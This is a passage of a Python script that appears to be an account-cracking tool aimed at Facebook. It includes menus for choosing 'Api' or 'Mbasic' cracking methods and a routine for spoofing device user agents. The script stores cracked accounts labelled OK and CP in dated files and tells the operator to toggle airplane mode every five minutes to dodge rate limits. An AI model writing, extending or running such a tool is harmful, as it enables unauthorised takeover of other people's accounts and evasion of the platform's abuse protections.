    pri_('%s[%s6%s] %sOppo'%(P_,W_,P_,W_))
    pri_('%s[%s7%s] %sSamsung'%(P_,W_,P_,W_))
    pri_('%s[%s8%s] %sWindows'%(P_,W_,P_,W_))
    pc = inp_('%s[%s•%s] %schoose : '%(P_,W_,P_,W_))
    pri_('')
    if pc in['']:
        pri_('%s[%s!%s] %sCorrect Content'%(R_,W_,R_,W_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    elif pc in ['1','01']:
        ugent = opn_('ugent.txt','w');ugent.write(ua_xiaomi);ugent.close()
    elif pc in ['2','02']:
        ugent = opn_('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
    elif pc in ['3','03']:
        ugent = opn_('ugent.txt','w');ugent.write(ua_asus);ugent.close()
    elif pc in ['4','04']:
        ugent = opn_('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
    elif pc in ['5','05']:
        ugent = opn_('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
    elif pc in ['6','06']:
        ugent = opn_('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
    elif pc in ['7','07']:
        ugent = opn_('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
    elif pc in ['8','08']:
        ugent = opn_('ugent.txt','w');ugent.write(ua_windows);ugent.close()
    else:
        pri_('%s[%s!%s] %sCorrect Content'%(R_,W_,R_,W_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    pri_("%s[ %sSuccessfully Changed User Agent %s]"%(P_,W_,P_))
    inp_('\n%s[ %sEnter %s]%s'%(P_,W_,P_,W_))
    _menu_dev_(_Dapunta_Sayang_Cici_)

### Tampilan User Agent
def _var_ugen_(_Dapunta_Cinta_Cici_):
    pri_("%s[%s1%s] %sGet User Agent"%(P_,W_,P_,W_))
    pri_("%s[%s2%s] %schange user agent %s[%sManual%s]"%(P_,W_,P_,W_,P_,W_,P_))
    pri_("%s[%s3%s] %schange user agent %s[%sAdjust HP%s]"%(P_,W_,P_,W_,P_,W_,P_))
    pri_("%s[%s4%s] %sDelete User Agent"%(P_,W_,P_,W_))
    pri_("%s[%s5%s] %sChecek User Agent"%(P_,W_,P_,W_))
    pri_("%s[%s0%s] %sEnter"%(P_,W_,P_,W_))

### Tampilan Metode
def start_method():
    pri_('\n%s[%s1%s] %sMetode Api'%(P_,W_,P_,W_))
    pri_('%s[%s2%s] %sMetode Mbasic'%(P_,W_,P_,W_))

### Tampilan Mulai Crack
def started():
    pri_('%s[%s•%s] %sCrack In Progress...'%(P_,W_,P_,W_))
    pri_('%s[%s•%s] %sAcount [OK] saved in OK/%s.txt'%(P_,W_,P_,W_,tanggal))
    pri_('%s[%s•%s] %sAcount [CP] saved in CP/%s.txt'%(P_,W_,P_,W_,tanggal))
    pri_('%s[%s•%s] %sActivate Airplane Mode [5 Seconds Only] Every 5 Minutes\n'%(P_,W_,P_,W_))

### Start
if __name__=='__main__':
    os.system('git pull')
    _clear_()
    _folder_()
    _check_recode_(_oscylopsce_,_ascylapsci_,_escylipsce_)

# pri_('%s[%s•%s] %s'%(P_,W_,P_,W_))
# pri_('%s[%s!%s] %s'%(R_,W_,R_,W_))
